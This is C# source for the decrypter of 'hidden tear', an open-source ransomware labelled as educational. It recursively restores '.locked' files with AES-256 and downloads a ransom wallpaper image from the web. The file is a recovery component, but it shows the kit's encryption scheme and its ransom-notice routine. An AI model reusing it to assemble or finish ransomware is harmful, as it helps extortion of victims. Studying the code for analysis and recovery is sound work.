/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_| 
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 */
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.AccessControl;


namespace hidden_tear_decrypter
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        string userName = Environment.UserName;
        string userDir = "C:\\Users\\최고의 지식근로자\\Desktop\\";
        string backgroundImageUrl = "http://i.imgur.com/5Yuq9Qv.jpg"; //desktop background picture
        int decrypted;

        public Form1()
        {
            InitializeComponent();
        }

        public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                     
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                        
                  
                }
            }

            return decryptedBytes;
        }

        public void DecryptFile(string file,string password)
        {

            byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            File.WriteAllBytes(file, bytesDecrypted);
            string extension = System.IO.Path.GetExtension(file);
            string result = file.Substring(0, file.Length - extension.Length);
            System.IO.File.Move(file, result);

        }

        public void DecryptDirectory(string location)
        {
            try
            {
                label5.Visible = false;
                label3.Visible = false;
                string password = textBox1.Text;

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (extension == ".locked")
                    {
                        DecryptFile(files[i], password);
                        decrypted++;
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    DecryptDirectory(childDirectories[i]);
                }
                if (decrypted > 0)
                {
                    label3.Visible = true;
                }
                else
                {
                    label5.Visible = true;
                }
            }
            catch(Exception ex)
            {

            }

        }

        public void changeDesktop()
        {
            string backgroundImageName = userDir + userName + "\\ransom.jpg";
            SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //string path_1 = "Users\\test\\";
            label4.Visible = true;
            DialogResult result = MessageBox.Show("Decrypting files... Please wait while doesn't appears Files decrypted and don't worry if software doesn't answear.", "Press ok to start decryption process.", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
            if (result == DialogResult.Cancel)
            {
                Application.Exit();
            }
            else
            {
                decrypted = 0;
                string fullpath_0 = userDir + "\\test\\ransomware";
                //string fullpath_1 = userDir + "\\test\\Links";
                //string fullpath_2 = userDir + "\\test\\Contacts";
                //string fullpath_3 = userDir + "\\test\\Desktop";
                //string fullpath_4 = userDir + "\\test\\Documents";
                //string fullpath_5 = userDir + "\\test\\Downloads";
                //string fullpath_6 = userDir + "\\test\\Pictures";
                //string fullpath_7 = userDir + "\\test\\Music";
                //string fullpath_8 = userDir + "\\test\\OneDrive";
                //string fullpath_9 = userDir + "\\test\\Saved Games";
                //string fullpath_10 = userDir + "\\test\\Favorites";
                //string fullpath_11 = userDir + "\\test\\Searches";
                //string fullpath_12 = userDir + "\\test\\Videos";
                DecryptDirectory(fullpath_0);
                //DecryptDirectory(fullpath_1);
                //DecryptDirectory(fullpath_2);
                //DecryptDirectory(fullpath_3);
                //DecryptDirectory(fullpath_4);
                //DecryptDirectory(fullpath_5);
                //DecryptDirectory(fullpath_6);
                //DecryptDirectory(fullpath_7);
                //DecryptDirectory(fullpath_8);
                //DecryptDirectory(fullpath_9);
                //DecryptDirectory(fullpath_10);
                //DecryptDirectory(fullpath_11);
                //DecryptDirectory(fullpath_12);

                if (decrypted > 0)
                {
                    changeDesktop();
                }

                label4.Visible = false;

            }

        }

        //Changes desktop background image
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        //Downloads image from web
        private void SetWallpaperFromWeb(string url, string path)
        {
            try
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile(new Uri(url), path);
                SetWallpaper(path);
            }
            catch { }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        
        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click_1(object sender, EventArgs e)
        {

        }
    }
}
